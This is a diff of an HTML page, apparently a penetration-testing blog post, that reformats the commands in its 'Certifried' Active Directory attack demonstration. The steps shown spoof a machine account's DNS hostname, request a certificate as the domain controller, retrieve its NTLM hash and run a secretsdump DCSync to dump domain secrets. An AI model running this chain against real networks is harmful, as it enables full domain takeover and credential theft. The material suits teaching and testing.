@@ -102,7 +102,9 @@
 
 <h1 id="attack-demonstration">Attack Demonstration</h1>
 <h2 id="1-joining-a-machine-account-to-the-domain-with-a-spoofed-dnshostname">1. Joining A Machine Account to The Domain with A Spoofed DNSHostname</h2>
-<p><strong>Command:</strong> <code class="language-plaintext highlighter-rouge">certipy account create &lt;DOMAIN_FQDN&gt;/&lt;AD_USER&gt;@&lt;DC_IP&gt; -user '&lt;NEW_COMPUTER_NAME&gt;' -dns &lt;DC_FQDN&gt;</code></p>
+<p><strong>Command:</strong></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>certipy account create &lt;DOMAIN_FQDN&gt;/&lt;AD_USER&gt;@&lt;DC_IP&gt; <span class="nt">-user</span> <span class="s1">'&lt;NEW_COMPUTER_NAME&gt;'</span> <span class="nt">-dns</span> &lt;DC_FQDN&gt;
+</code></pre></div></div>
 
 <p><img src="/assets/Certifried/creating-computer-with-spoofed-dns-hostname.jpg" alt="creating-computer-with-spoofed-dns-hostname" /></p>
 
@@ -115,19 +117,25 @@
 
 <p><img src="/assets/Certifried/finding-out-the-ca-name.jpg" alt="finding-out-the-ca-name" /></p>
 
-<p><strong>Command:</strong> <code class="language-plaintext highlighter-rouge">certipy req -dc-ip &lt;DC_IP&gt; &lt;DOMAIN_FQDN&gt;/'&lt;ADDED_COMPUTER_NAME_ENDING_WITH_DOLLAR_SIGN&gt;'@&lt;DC_IP&gt; -ca &lt;CA_NAME&gt; -template Machine</code></p>
+<p><strong>Command:</strong></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>certipy req <span class="nt">-dc-ip</span> &lt;DC_IP&gt; &lt;DOMAIN_FQDN&gt;/<span class="s1">'&lt;ADDED_COMPUTER_NAME_ENDING_WITH_DOLLAR_SIGN&gt;'</span>@&lt;DC_IP&gt; <span class="nt">-ca</span> &lt;CA_NAME&gt; <span class="nt">-template</span> Machine
+</code></pre></div></div>
 
 <p>Password = the same password generated from the computer creation in the previous step</p>
 
 <p><img src="/assets/Certifried/requesting-dc-cert.jpg" alt="requesting-dc-cert" /></p>
 
 <h2 id="3-using-the-domain-controllers-certificate-to-get-its-ntlm-hash">3. Using the Domain Controller’s Certificate To Get its NTLM Hash</h2>
-<p><strong>Command:</strong> <code class="language-plaintext highlighter-rouge">certipy auth -pfx &lt;GENERATED_PFX_CERTIFICATE&gt;</code></p>
+<p><strong>Command:</strong></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>certipy auth <span class="nt">-pfx</span> &lt;GENERATED_PFX_CERTIFICATE&gt;
+</code></pre></div></div>
 
 <p><img src="/assets/Certifried/got-nt-hash-for-dc.jpg" alt="got-nt-hash-for-dc" /></p>
 
 <h2 id="4-performing-dcsync-as-the-impersonated-domain-controller">4. Performing DCSync As The Impersonated Domain Controller</h2>
-<p><strong>Command:</strong> <code class="language-plaintext highlighter-rouge">secretsdump.py -just-dc &lt;DOMAIN_FQDN&gt;/'&lt;DC_NAME_ENDING_WITH_DOLLAR_SIGN&gt;'@&lt;DC_IP&gt; -hashes :&lt;RETRIEVED_HASH&gt;</code></p>
+<p><strong>Command:</strong></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>secretsdump.py <span class="nt">-just-dc</span> &lt;DOMAIN_FQDN&gt;/<span class="s1">'&lt;DC_NAME_ENDING_WITH_DOLLAR_SIGN&gt;'</span>@&lt;DC_IP&gt; <span class="nt">-hashes</span> :&lt;RETRIEVED_HASH&gt;
+</code></pre></div></div>
 
 <p><img src="/assets/Certifried/dc-sync-with-dc-ntlm-hash.jpg" alt="dc-sync-with-dc-ntlm-hash" /></p>
 
